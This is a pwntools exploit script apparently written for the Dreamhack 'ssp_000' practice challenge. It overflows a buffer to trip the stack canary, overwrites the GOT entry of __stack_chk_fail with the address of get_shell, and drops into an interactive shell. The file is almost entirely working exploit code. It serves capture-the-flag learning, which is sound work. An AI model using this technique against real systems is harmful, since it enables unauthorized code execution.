from pwn import *

PORT = 19270
HOST = "host3.dreamhack.games"
exe = context.binary = ELF('./ssp_000', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*0x0000000000400997
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

# GDB()

p.send(b"d1nhdwc"*0x10)

p.sendlineafter(b"Addr : ", str(exe.got.__stack_chk_fail).encode())
p.sendlineafter(b"Value : ", str(exe.sym.get_shell).encode())

p.interactive()